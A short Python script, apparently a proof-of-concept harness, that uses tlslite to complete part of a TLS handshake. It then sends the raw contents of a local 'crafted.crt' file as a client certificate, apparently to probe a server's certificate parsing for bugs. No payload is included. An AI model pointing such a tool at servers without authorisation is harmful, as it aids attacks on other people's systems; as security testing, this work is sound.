from socket import socket, AF_INET, SOCK_STREAM

from tlslite import TLSConnection
from tlslite.constants import *
from tlslite.messages import CertificateRequest, HandshakeMsg
from tlslite.utils.codec import Writer
import argparse


class CraftedTLSConnection(TLSConnection):

    def _clientKeyExchange(self, settings, cipherSuite,
                           clientCertChain, privateKey,
                           certificateType,
                           tackExt, clientRandom, serverRandom,
                           keyExchange):
        if cipherSuite in CipherSuite.certAllSuites:
            # Consume server certificate message
            for result in self._getMsg(ContentType.handshake,
                                       HandshakeType.certificate,
                                       certificateType):
                if result in (0, 1):
                    yield result
                else:
                    break

        if cipherSuite not in CipherSuite.certSuites:
            # possibly consume SKE message
            for result in self._getMsg(ContentType.handshake,
                                       HandshakeType.server_key_exchange,
                                       cipherSuite):
                if result in (0, 1):
                    yield result
                else:
                    break

        # Consume Certificate request if any, if not bail
        for result in self._getMsg(ContentType.handshake,
                                   (HandshakeType.certificate_request,
                                    HandshakeType.server_hello_done)):
            if isinstance(result, CertificateRequest):
                craftedCertificate = CraftedCertificate(certificateType)

                craftedCertificate.create(open('crafted.crt', "rb").read())
                for r in self._sendMsg(craftedCertificate):
                    yield r
                print("Crafted Certificate msg sent, check server.")
                exit(0)

            else:
                print("Server does not support TLS client authentication, nothing to do.")
                exit(1)


class CraftedCertificate(HandshakeMsg):
    def __init__(self, certificateType):
        HandshakeMsg.__init__(self, HandshakeType.certificate)
        self.certificateType = certificateType
        self.certChain = None
        self.der = bytearray(0)

    def create(self, certBytes):
        self.der = certBytes

    def write(self):
        w = Writer()
        if self.certificateType == CertificateType.x509:
            chainLength = len(self.der) + 3
            w.add(chainLength, 3)
            w.addVarSeq(self.der, 1, 3)
        else:
            raise AssertionError()
        return self.postWrite(w)


def run(server, port):
    sock = socket(AF_INET, SOCK_STREAM)
    sock.connect((server, port))
    connection = CraftedTLSConnection(sock)
    connection.handshakeClientCert()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Parameters')
    parser.add_argument('--server', dest='server', type=str, help='Name of the server to connect for the TLS handshake, defaults to "localhost"', default='localhost')
    parser.add_argument('--port', dest='port', type=int, help='Port where server listens for TLS connections, defaults to "443"', default=443)
    args = parser.parse_args()
    run(args.server, args.port)
